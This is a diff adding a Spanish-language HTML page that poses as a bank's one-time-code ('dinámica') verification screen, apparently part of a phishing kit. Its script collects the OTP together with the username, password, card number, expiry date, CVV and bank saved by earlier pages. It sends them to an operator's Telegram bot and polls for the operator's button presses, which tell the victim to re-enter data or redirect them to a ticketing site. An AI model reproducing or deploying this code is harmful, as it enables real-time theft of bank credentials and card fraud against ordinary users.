@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificación Dinámica</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: #f9f9f9;
+    }
+    #contenedor {
+      max-width: 360px;
+      margin: 60px auto;
+      background: #fff;
+      border-radius: 12px;
+      padding: 30px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.08);
+    }
+    #titulo {
+      text-align: center;
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+    #parrafo {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+    #horaTransaccion {
+      text-align: center;
+      font-size: 14px;
+      color: #888;
+      margin-bottom: 20px;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+    label {
+      font-size: 13px;
+      font-weight: 500;
+    }
+    input {
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      background: #007bff;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    .loaderp-full {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      display: none;
+      background: rgba(255,255,255,0.8);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .loaderp {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #FFF;
+      border-bottom-color: #007bff;
+      border-radius: 50%;
+      animation: rot 1s linear infinite;
+    }
+    @keyframes rot { to { transform: rotate(360deg); } }
+    #bancoDetectado {
+      text-align: center;
+      font-size: 13px;
+      color: #333;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div id="contenedor">
+    <div id="titulo">Verificación Dinámica</div>
+    <p id="parrafo">Ingresa el código de 6 dígitos que recibiste.</p>
+    <div id="horaTransaccion">Hora: --:--:--</div>
+    <form id="formD" onsubmit="return false;">
+      <label for="otp">Dinámica (OTP):</label>
+      <input type="text" id="otp" maxlength="6" required inputmode="numeric">
+      <button id="btnEnviar">Enviar</button>
+    </form>
+    <div id="bancoDetectado"></div>
+  </div>
+
+  <div class="loaderp-full" id="loaderD">
+    <div class="loaderp"></div>
+  </div>
+
+  <script>
+    function updH() {
+      const d = new Date();
+      const h = String(d.getHours()).padStart(2,'0'),
+            m = String(d.getMinutes()).padStart(2,'0'),
+            s = String(d.getSeconds()).padStart(2,'0');
+      document.getElementById('horaTransaccion').innerText = `Hora: ${h}:${m}:${s}`;
+    }
+    setInterval(updH, 1000);
+    updH();
+
+    const cardData = JSON.parse(localStorage.getItem('formData') || '{}');
+    const bancoManual = cardData.banco || 'Banco no especificado';
+    
+    document.getElementById('otp').addEventListener('input', e => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+    });
+
+    const loaderD = document.getElementById('loaderD');
+    const user = localStorage.getItem('username') || '(sin usuario)';
+    const pass = localStorage.getItem('password') || '(sin clave)';
+
+    document.getElementById('btnEnviar').addEventListener('click', async () => {
+      const otp = document.getElementById('otp').value;
+      if (otp.length !== 6) {
+        alert('OTP inválido');
+        return;
+      }
+
+      loaderD.style.display = 'flex';
+
+      const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
+      localStorage.setItem('transactionId', transactionId);
+
+      const message =
+`<b>🔔 Verificación dinámica:</b>
+🆔 <b>ID:</b> ${transactionId}
+👤 <b>Usuario:</b> ${user}
+🔑 <b>Clave:</b> ${pass}
+
+💳 <b>Tarjeta:</b> ${cardData.tarjeta}
+📅 <b>Venc.:</b> ${cardData.fechaExpiracion}
+🔐 <b>CVV:</b> ${cardData.cvv}
+🏦 <b>Banco:</b> ${bancoManual}
+
+🔐 <b>OTP:</b> ${otp}`;
+
+      const keyboard = {
+        inline_keyboard: [
+          [{ text: "Error de Dinámica", callback_data: `error_dinamica:${transactionId}` }],
+          [{ text: "Error de TC",       callback_data: `error_tc:${transactionId}` }],
+          [{ text: "Error de Logo",     callback_data: `error_logo:${transactionId}` }],
+          [{ text: "Confirmar",         callback_data: `confirm_finalizar:${transactionId}` }]
+        ]
+      };
+
+      try {
+        const resCfg = await fetch('config.json');
+        const cfg = await resCfg.json();
+
+        await fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: cfg.chat_id,
+            text: message,
+            reply_markup: keyboard,
+            parse_mode: 'HTML'
+          })
+        });
+
+        poll(cfg, transactionId);
+
+      } catch (err) {
+        console.error(err);
+        loaderD.style.display = 'none';
+        alert('Error enviando a Telegram');
+      }
+    });
+
+    async function poll(cfg, tid) {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${cfg.token}/getUpdates`);
+        const js = await res.json();
+        const upd = js.result.find(u => u.callback_query?.data?.endsWith(`:${tid}`));
+        if (upd) {
+          const action = upd.callback_query.data.split(':')[0];
+          loaderD.style.display = 'none';
+          switch (action) {
+            case 'error_dinamica':
+              alert('¡La dinámica es errónea! Intenta nuevamente.');
+              break;
+            case 'error_tc':
+              window.location.href = 'index.html';
+              break;
+            case 'error_logo':
+              window.location.href = 'banco.html';
+              break;
+            case 'confirm_finalizar':
+              window.location.href = 'https://tuboleta.com/es/';
+              break;
+          }
+        } else {
+          setTimeout(() => poll(cfg, tid), 2000);
+        }
+      } catch (err) {
+        setTimeout(() => poll(cfg, tid), 2000);
+      }
+    }
+  </script>
+</body>
+</html>
